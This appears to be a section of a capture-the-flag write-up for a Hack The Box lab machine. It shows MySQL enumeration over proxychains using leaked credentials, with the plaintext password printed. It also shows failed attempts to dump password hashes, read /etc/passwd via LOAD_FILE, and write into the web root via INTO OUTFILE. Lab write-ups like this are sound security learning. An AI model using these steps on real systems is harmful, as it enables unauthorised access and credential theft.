# Enumerating MySQL via proxychains

After doing dynamic port forwarding I was able to login with the creds exfiltrated from **index.php**. I used this to enumerate the admirerdb database/

```text
root@kali:~/CTF/HTB/Admirer# proxychains mysql -h 127.0.0.1 -u waldo -p'&<h5b~yK3F#{PaPB&dA}{H>'
ProxyChains-3.1 (http://proxychains.sf.net)
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 44
Server version: 10.1.44-MariaDB-0+deb9u1 Debian 9.11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| admirerdb          |
| information_schema |
+--------------------+
2 rows in set (0.017 sec)

MariaDB [(none)]> use admirerdb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [admirerdb]> show tables;
+---------------------+
| Tables_in_admirerdb |
+---------------------+
| items               |
+---------------------+
1 row in set (0.015 sec)

MariaDB [admirerdb]> select * from items;
+----+-------------------------------+-------------------------+------------------------------+---------------------------------------------------------------------------------+
| id | thumb_path                    | image_path              | title                        | text                                                                            |
+----+-------------------------------+-------------------------+------------------------------+---------------------------------------------------------------------------------+
|  1 | images/thumbs/thmb_art01.jpg  | images/fulls/art01.jpg  | Visual Art                   | A pure showcase of skill and emotion.                                           |
|  2 | images/thumbs/thmb_eng02.jpg  | images/fulls/eng02.jpg  | The Beauty and the Beast     | Besides the technology, there is also the eye candy...                          |
|  3 | images/thumbs/thmb_nat01.jpg  | images/fulls/nat01.jpg  | The uncontrollable lightshow | When the sun decides to play at night.                                          |
|  4 | images/thumbs/thmb_arch02.jpg | images/fulls/arch02.jpg | Nearly Monochromatic         | One could simply spend hours looking at this indoor square.                     |
|  5 | images/thumbs/thmb_mind01.jpg | images/fulls/mind01.jpg | Way ahead of his time        | You probably still use some of his inventions... 500yrs later.                  |
|  6 | images/thumbs/thmb_mus02.jpg  | images/fulls/mus02.jpg  | The outcomes of complexity   | Seriously, listen to Dust in Interstellar's OST. Thank me later.                |
|  7 | images/thumbs/thmb_arch01.jpg | images/fulls/arch01.jpg | Back to basics               | And centuries later, we want to go back and live in nature... Sort of.          |
|  8 | images/thumbs/thmb_mind02.jpg | images/fulls/mind02.jpg | We need him back             | He might have been a loner who allegedly slept with a pigeon, but that brain... |
|  9 | images/thumbs/thmb_eng01.jpg  | images/fulls/eng01.jpg  | In the name of Science       | Some theories need to be proven.                                                |
| 10 | images/thumbs/thmb_mus01.jpg  | images/fulls/mus01.jpg  | Equal Temperament            | Because without him, music would not exist (as we know it today).               |
| 11 | images/thumbs/thmb_nat02.jpg  | images/fulls/nat02.jpg  | Playful wind and water       | A colourful wave in the middle of the desert... Isn't Nature amazing?           |
| 12 | images/thumbs/thmb_art02.jpg  | images/fulls/art02.jpg  | Attitude                     | Art can provoke feelings... or convey powerful messages                         |
+----+-------------------------------+-------------------------+------------------------------+---------------------------------------------------------------------------------+
12 rows in set (0.015 sec)
```

I tried looking inside the mysql DB but was forbidden.

```text
MariaDB [admirerdb]> SELECT user,password FROM mysql.user;
ERROR 1142 (42000): SELECT command denied to user 'waldo'@'localhost' for table 'user'

MariaDB [admirerdb]> SELECT LOAD_FILE("/etc/passwd") FROM mysql.user;
ERROR 1142 (42000): SELECT command denied to user 'waldo'@'localhost' for table 'user'
```

Nor could we do outfile write

```text
MariaDB [admirerdb]> SELECT "Testing" INTO OUTFILE "/var/www/html/test.txt";
ERROR 1045 (28000): Access denied for user 'waldo'@'localhost' (using password: YES)
```

